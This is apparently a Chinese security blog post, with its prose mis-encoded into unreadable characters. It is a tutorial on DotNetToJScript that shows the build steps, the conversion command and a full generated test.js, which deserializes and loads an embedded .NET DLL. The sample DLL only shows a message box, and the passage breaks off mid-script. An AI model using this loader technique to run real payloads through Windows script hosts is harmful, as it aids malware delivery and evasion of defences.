    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-03-10 17:48:22</p></blockquote><p><img src="/wallpaper/girl_umbrella_rain.jpg" alt></p><h2 id="0x00-First-of-All"><a href="#0x00-First-of-All" class="headerlink" title="0x00 First of All"></a>0x00 First of All</h2><p><code>DotNetToJScript</code>å’Œ<code>GadgetToJScript</code>ä¸¤ä¸ªé¡¹ç›®éƒ½å¯ä»¥å°†.Netç¨‹åºå°è£…åœ¨VBSæˆ–JSè„šæœ¬ä¸­æ‰§è¡Œã€‚</p><h2 id="0x01-DotNetToJScript"><a href="#0x01-DotNetToJScript" class="headerlink" title="0x01 DotNetToJScript"></a>0x01 DotNetToJScript</h2><h3 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h3><p><strong>Github</strong>: <a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a></p><p>.Net æ¡†æ¶ç‰ˆæœ¬è®¾ç½®ä¸º 2.0<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/B1113037-3EC1-4834-8D1C-7CCA24F5B441.png" alt="058f3d723cd0ca2e7485f1d7216ac3c3"></p><p>æŠ¥é”™ï¼š<br><strong>ç¼ºå°‘ç¨‹åºé›†å¼•ç”¨Linq</strong></p><p>è§£å†³æ–¹æ³•ï¼š<br>æ·»åŠ å¼•ç”¨ C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Core.dll<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/EB5B5FC7-8B78-4760-B987-D75E1EA5B1CF.png" alt="ea1a5641956a7a28b2c0b406c4aba31b"></p><p>ç¼–è¯‘æˆåŠŸåï¼Œç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼š<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/224550E5-0CF0-4FB2-BA22-71F851DECF61.png" alt="a8b20407d74ef46db31d6f6fb25aea3a"></p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>æ‰“å¼€ExampleAssemblyçš„csæºæ–‡ä»¶<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/4E5547AC-A42A-4474-8074-D1877D264A96.png" alt="4fb98a768dd4466219da984e3e33668a"></p><p>å¯ä»¥çœ‹åˆ°å…¶å®åªæ˜¯è°ƒç”¨äº†MessageBox()å‡½æ•°ï¼Œå¼¹å‡ºä¸€ä¸ªæ¡†ï¼Œå…ˆåˆ©ç”¨è¿™ä¸ªDllè¿›è¡Œæµ‹è¯•<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/EA43F55B-3774-4048-BD03-7D976B3461A0.png" alt="a6dd3c16e5364d4551644edce13ff04f"></p><h4 id="ToJS"><a href="#ToJS" class="headerlink" title="ToJS"></a>ToJS</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -o test.js ExampleAssembly.dll</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/B232AF55-CDEE-42D9-86C7-5C2A65A31E68.png" alt="d8d99c7eca3c63409950aa5c58b28188"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/D0A4CE12-463B-4D8D-8ECB-5970A4DA9DED.png" alt="af601612607744683f8090933703b42b"></p><p>æ‰“å¼€test.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setversion</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params">s</span>) </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64ToStream</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> enc = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Text.ASCIIEncoding"</span>);</span><br><span class="line"><span class="keyword">var</span> length = enc.GetByteCount_2(b);</span><br><span class="line"><span class="keyword">var</span> ba = enc.GetBytes_4(b);</span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Security.Cryptography.FromBase64Transform"</span>);</span><br><span class="line">ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line"><span class="keyword">var</span> ms = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.IO.MemoryStream"</span>);</span><br><span class="line">ms.Write(ba, <span class="number">0</span>, (length / <span class="number">4</span>) * <span class="number">3</span>);</span><br><span class="line">ms.Position = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> ms;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> serialized_obj = <span class="string">"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"</span>+</span><br><span class="line"><span class="string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span>+</span><br><span class="line"><span class="string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span>+</span><br><span class="line"><span class="string">"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"</span>+</span><br><span class="line"><span class="string">"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"</span>+</span><br><span class="line"><span class="string">"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"</span>+</span><br><span class="line"><span class="string">"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"</span>+</span><br><span class="line"><span class="string">"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"</span>+</span><br><span class="line"><span class="string">"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"</span>+</span><br><span class="line"><span class="string">"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"</span>+</span><br><span class="line"><span class="string">"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"</span>+</span><br><span class="line"><span class="string">"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"</span>+</span><br><span class="line"><span class="string">"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"</span>+</span><br><span class="line"><span class="string">"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"</span>+</span><br><span class="line"><span class="string">"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"</span>+</span><br><span class="line"><span class="string">"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"</span>+</span><br><span class="line"><span class="string">"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"</span>+</span><br><span class="line"><span class="string">"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"</span>+</span><br><span class="line"><span class="string">"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"</span>+</span><br><span class="line"><span class="string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span>+</span><br><span class="line"><span class="string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span>+</span><br><span class="line"><span class="string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span>+</span><br><span class="line"><span class="string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMADRBnXgAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAA4AAiIAsBMAAACgAAAAgAAAAAAAAaKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAyCcA"</span>+</span><br><span class="line"><span class="string">"AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAJAmAAAcAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAALnRleHQAAAAgCAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"</span>+</span><br><span class="line"><span class="string">"AAAABgAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPwnAAAAAAAASAAAAAIABQB4IAAAGAYAAAEAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcgIoDgAACgAA"</span>+</span><br><span class="line"><span class="string">"cgEAAHByAQAAcBYfMCgPAAAKJiomAAMoEAAACiYqAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3"</span>+</span><br><span class="line"><span class="string">"AAAAAAUAbAAAAAQCAAAjfgAAcAIAAIACAAAjU3RyaW5ncwAAAADwBAAADAAAACNVUwD8BAAAEAAA"</span>+</span><br><span class="line"><span class="string">"ACNHVUlEAAAADAUAAAwBAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAUAAAA"</span>+</span><br><span class="line"><span class="string">"AgAAAAIAAAABAAAAEAAAAA4AAAABAAAAAwAAAAAAZAEBAAAAAAAGANQA2AEGAEEB2AEGACEApgEP"</span>+</span><br><span class="line"><span class="string">"APgBAAAGAEkAjgEGALcAjgEGAJgAjgEGACgBjgEGAPQAjgEGAA0BjgEGAGAAjgEGADUAuQEGABMA"</span>+</span><br><span class="line"><span class="string">"uQEGAHsAjgEGAEMCeAEKAGICBwIKAEoCBwIKABwCBwIKAH8BBwIOADsCpgEAAAAAAQAAAAAAAQAB"</span>+</span><br><span class="line"><span class="string">"AAEAEAAuAgAAPQABAAEAUCAAAAAAhhigAQYAAQBtIAAAAACGADgCEAABAAAAAQBfAQkAoAEBABEA"</span>+</span><br><span class="line"><span class="string">"oAEGABkAoAEKACkAoAEQADEAoAEQADkAoAEQAEEAoAEQAEkAoAEQAFEAoAEQAFkAoAEQAGEAoAEV"</span>+</span><br><span class="line"><span class="string">"AGkAoAEQAHEAoAEQAHkAoAEGAIEAXQIaAKEAVwIlAC4ACwA0AC4AEwA9AC4AGwBcAC4AIwBlAC4A"</span>+</span><br><span class="line"><span class="string">"KwB6AC4AMwCkAC4AOwCkAC4AQwBlAC4ASwCqAC4AUwCkAC4AWwCkAC4AYwDPAC4AawD5AEMAWwAG"</span>+</span><br><span class="line"><span class="string">"AQSAAAABAAAAAAAAAAAAAAAAAG0CAAACAAAAAAAAAAAAAAArAAoAAAAAAAIAAAAAAAAAAAAAACsA"</span>+</span><br><span class="line"><span class="string">"BwIAAAAAAgAAAAAAAAAAAAAAKwB4AQAAAAAAAAA8TW9kdWxlPgBtc2NvcmxpYgBHdWlkQXR0cmli"</span>+</span><br><span class="line"><span class="string">"dXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxl"</span>+</span><br><span class="line"><span class="string">"QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25B"</span>+</span><br><span class="line"><span class="string">"dHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRp"</span>+</span><br><span class="line"><span class="string">"b25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1"</span>+</span><br><span class="line"><span class="string">"Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0"</span>+</span><br><span class="line"><span class="string">"cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHBhdGgARXhhbXBsZUFzc2VtYmx5"</span>+</span><br><span class="line"><span class="string">"LmRsbABTeXN0ZW0ATWVzc2FnZUJveEljb24AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVt"</span>+</span><br><span class="line"><span class="string">"LkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGlt"</span>+</span><br><span class="line"><span class="string">"ZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAE1l"</span>+</span><br><span class="line"><span class="string">"c3NhZ2VCb3hCdXR0b25zAFRlc3RDbGFzcwBSdW5Qcm9jZXNzAE9iamVjdABEaWFsb2dSZXN1bHQA"</span>+</span><br><span class="line"><span class="string">"U3RhcnQAU2hvdwBNZXNzYWdlQm94AEV4YW1wbGVBc3NlbWJseQAAAAAACVQAZQBzAHQAAADj3KEj"</span>+</span><br><span class="line"><span class="string">"e42OT40NcZVxyoeHAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIKAAQRRQ4OEUkRTQUAARJRDgi3"</span>+</span><br><span class="line"><span class="string">"elxWGTTgiQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAU"</span>+</span><br><span class="line"><span class="string">"AQAPRXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2Ny"</span>+</span><br><span class="line"><span class="string">"aXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4"</span>+</span><br><span class="line"><span class="string">"ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAAAAUBAAEAAAAAAAAM"</span>+</span><br><span class="line"><span class="string">"EGdeAAAAAAIAAAAcAQAArCYAAKwIAABSU0RTyVZuj/N+iUu1llptRFdfnAEAAABDOlxVc2Vyc1xQ"</span>+</span><br><span class="line"><span class="string">"YXRyaWxpY1xEZXNrdG9wXERvdE5ldFRvSlNjcmlwdFxFeGFtcGxlQXNzZW1ibHlcb2JqXERlYnVn"</span>+</span><br><span class="line"><span class="string">"XEV4YW1wbGVBc3NlbWJseS5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAnAAAAAAAAAAAAAAooAAAAIAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAD8JwAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAsAMAAAAAAAAAAAAAsAM0AAAA"</span>+</span><br><span class="line"><span class="string">"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"</span>+</span><br><span class="line"><span class="string">"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"</span>+</span><br><span class="line"><span class="string">"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBBADAAABAFMAdAByAGkAbgBn"</span>+</span><br><span class="line"><span class="string">"AEYAaQBsAGUASQBuAGYAbwAAAOwCAAABADAAMAAwADAAMAA0AGIAMAAAAGIAJQABAEMAbwBtAG0A"</span>+</span><br><span class="line"><span class="string">"ZQBuAHQAcwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0"</span>+</span><br><span class="line"><span class="string">"AE4AZQB0AFQAbwBKAFMAYwByAGkAcAB0AAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AGEAbQBw"</span>+</span><br><span class="line"><span class="string">"AGwAZQBBAHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEA"</span>+</span><br><span class="line"><span class="string">"LgAwAC4AMAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABhAG0AcABs"</span>+</span><br><span class="line"><span class="string">"AGUAQQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABiAB8AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkA"</span>+</span><br><span class="line"><span class="string">"ZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEAbQBlAHMAIABGAG8AcgBzAGgAYQB3"</span>+</span><br><span class="line"><span class="string">"ACAAMgAwADEANwAAAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AABQABQAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBB"</span>+</span><br><span class="line"><span class="string">"AHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAA"</span>+</span><br><span class="line"><span class="string">"RQB4AGEAbQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQBy"</span>+</span><br><span class="line"><span class="string">"AHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIA"</span>+</span><br><span class="line"><span class="string">"cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABw4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"</span>+</span><br><span class="line"><span class="string">"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"</span>;</span><br><span class="line"><span class="keyword">var</span> entry_class = <span class="string">'TestClass'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">setversion();</span><br><span class="line"><span class="keyword">var</span> stm = 